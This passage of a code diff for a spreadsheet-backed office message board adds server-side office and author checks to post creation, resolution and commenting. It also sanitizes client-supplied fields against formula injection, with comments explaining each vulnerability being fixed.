-          return po.toLowerCase().indexOf(uo) !== -1 || uo.indexOf(po.toLowerCase()) !== -1;
-        });
-      });
-
-      if (!visible && hasClientAccess) {
-        visible = postOffices.some(function(po) { return po.toLowerCase() === 'all offices'; });
-      }
-
-      if (!visible) continue;
-    }
+    // NOTE: the old client-access branch here duplicated a condition already
+    // tested in the .some() above, so it could never change the outcome. Dropped
+    // rather than reimplemented — grant client users office access in _Users if
+    // they need to see another office's board.
+    if (!postVisibleToUser_(row[4], user)) continue;
 
     var comments = [];
     try { comments = JSON.parse(row[layout.comments] || '[]'); } catch(e) { comments = []; }
@@ -1055,34 +1304,56 @@ function handleCreatePost(data, user) {
   }
 
   var id = 'P-' + new Date().getTime();
-  var offices = (data.offices || ['All Offices']).join(',');
   var timestamp = new Date().toISOString();
 
+  // FIX: the client fully controlled the post's office scope — a single-office
+  // staff member could broadcast into offices they cannot read. The UI filters
+  // the chips, but that is cosmetic. Enforce it here, and type-check the field
+  // (a bare string used to throw on .join and leak the raw error to the caller).
+  var requested = data.offices;
+  if (!Array.isArray(requested)) requested = requested ? [String(requested)] : [];
+  requested = requested.map(function(o){ return String(o).trim(); })
+                       .filter(function(o){ return o.length > 0; });
+  if (requested.length === 0) requested = ['All Offices'];
+
+  if (!user.allOffices && user.role !== 'admin') {
+    requested = requested.filter(function(o) { return postVisibleToUser_(o, user); });
+    // Nothing the user may post to — scope it to their own offices instead of
+    // silently widening to company-wide.
+    if (requested.length === 0) {
+      requested = (user.offices || []).slice();
+      if (requested.length === 0) return { error: 'You have no office assigned — cannot post' };
+    }
+  }
+  var offices = requested.join(',');
+
+  // FIX: every field below is client-supplied and was appended raw. A leading
+  // '=' would have been stored as a live formula. See sanitizeCell_.
   if (layout.v === 3) {
-    sheet.appendRow([
+    sheet.appendRow(sanitizeRow_([
       id, data.type || 'broadcast', user.name, String(data.pin), offices,
       data.employeeName || '', data.phone || '', data.chqNo || '',
       data.empNo || '', data.jigId || '',
       data.client || '', data.week || '', data.hours || '', data.message || '',
       timestamp, false, '', '', '[]'
-    ]);
+    ]));
   } else if (layout.v === 2) {
-    sheet.appendRow([
+    sheet.appendRow(sanitizeRow_([
       id, data.type || 'broadcast', user.name, String(data.pin), offices,
       data.employeeName || '', data.phone || '', data.chqNo || '',
       data.client || '', data.week || '', data.hours || '', data.message || '',
       timestamp, false, '', '', '[]'
-    ]);
+    ]));
   } else {
-    sheet.appendRow([
+    sheet.appendRow(sanitizeRow_([
       id, data.type || 'broadcast', user.name, String(data.pin), offices,
       data.employeeName || '', data.client || '', data.week || '',
       data.hours || '', data.message || '',
       timestamp, false, '', '', '[]'
-    ]);
+    ]));
   }
 
-  return { id: id, author: user.name, timestamp: timestamp };
+  return { id: id, author: user.name, timestamp: timestamp, offices: requested };
 }
 
 // ── Resolve post ──
@@ -1094,9 +1365,20 @@ function handleResolvePost(data, user) {
 
   for (var i = 1; i < rows.length; i++) {
     if (rows[i][0] === data.postId) {
+      // FIX: this had no author check and no office check — unlike delete, which
+      // has both. Any authenticated user could resolve any post in any office.
+      // Resolved posts drop out of the default board view and are then deleted
+      // permanently by cleanupResolvedPosts after 14 days, so this silently
+      // destroyed other offices' wage disputes.
+      if (!postVisibleToUser_(rows[i][4], user)) {
+        return { error: 'Post not found' };
+      }
+      if (String(rows[i][3]) !== String(data.pin) && user.role !== 'admin') {
+        return { error: 'Only the author or an admin can resolve this post' };
+      }
       var now = new Date().toISOString();
       sheet.getRange(i + 1, layout.resolved + 1).setValue(true);
-      sheet.getRange(i + 1, layout.resolvedBy + 1).setValue(user.name);
+      sheet.getRange(i + 1, layout.resolvedBy + 1).setValue(sanitizeCell_(user.name));
       sheet.getRange(i + 1, layout.resolvedAt + 1).setValue(now);
       return { resolved: true, resolvedBy: user.name, resolvedAt: now };
     }
@@ -1131,6 +1413,11 @@ function handleAddPostComment(data, user) {
 
   for (var i = 1; i < rows.length; i++) {
     if (rows[i][0] === data.postId) {
+      // FIX: no office check here either — any user could comment, under their
+      // real name, on a post in an office they cannot see.
+      if (!postVisibleToUser_(rows[i][4], user)) {
+        return { error: 'Post not found' };
+      }
       var comments = [];
       try { comments = JSON.parse(rows[i][layout.comments] || '[]'); } catch(e) { comments = []; }
 
